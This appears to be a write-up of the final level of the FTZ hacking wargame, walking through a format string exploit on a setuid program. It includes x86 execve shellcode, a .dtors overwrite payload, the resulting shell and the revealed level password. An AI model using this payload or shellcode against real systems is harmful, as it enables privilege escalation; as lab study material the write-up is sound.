# Level20 (Final Level)

## This level's goal
- FSB (Format Sting Bug)

***

```
[level20@ftz level20]$ ls -l
-rwsr-sr-x    1 clear    clear       11777 Jun 18  2008 attackme
-rw-r-----    1 root     level20       133 May 13  2002 hint

[level20@ftz level20]$ cat hint

#include <stdio.h>
main(int argc,char **argv)
{ 
  char bleh[80];
  setreuid(3101,3101);
  fgets(bleh,79,stdin);
  printf(bleh);
}
```

In the hint, I could see the printf(bleh) that I might exploit with FSB.

```
[level20@ftz level20]$ ./attackme
AAA
AAA
[level20@ftz level20]$ ./attackme
%x
4f
[level20@ftz level20]$ ./attackme
AAAA %x %x %x %x
AAAA 4f 4212ecc0 4207a750 41414141
```

4f means 79 in decimal, it seeams that I could exploit in fourth.

```
[level20@ftz level20]$ gdb tmp/attackme
(gdb) disass main
No symbol "main" in current context.
```

I could not see the symbol, so I will get information with objdump.

```
[level20@ftz level20]$ objdump -h attackme

attackme:     file format elf32-i386

Sections:
Idx Name          Size      VMA       LMA       File off  Algn

 18 .dtors        00000008  08049594  08049594  00000594  2**2
                  CONTENTS, ALLOC, LOAD, DATA
                  
[level20@ftz tmp]$ export EGG=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
[level20@ftz tmp]$ cat getegg.c
#include <stdlib.h>
main() {
        printf("EGG : %p", getenv("EGG"));
}
[level20@ftz tmp]$ ./getegg
EGG : 0xbffffc8a
```

__DOTR_List's address is 0x08049594, and __DOTR_END is __DOTR_LIST + 4bytes = 0x08049598, which I will exploit with this.

I made the env variable of EGG(shell code) and then made and run getegg.c (to get EGG's address).

The attack code format   
`"AAAAAddress1BBBBAddress2%8x%8x%8x%Value1c%n%Value2c%n"`

Address1 = 0x08049598   
Address2 = 0x0804959A (Address1+2)   
Value1   = 64650(fc8a) - 40 = 64610   
Value2   = 114687(1bfff) - 64650 = 50037

```
[level20@ftz level20]$ (python -c 'print "AAAA\x98\x95\x04\x08AAAA\x9a\x95\x04\x08%8x%8x%8x%64610c%n%50037c%n"';cat) | ./attackme 

id
uid=3101(clear) gid=3100(level20) groups=3100(level20)

my-pass
clear Password is "i will come in a minute".
```


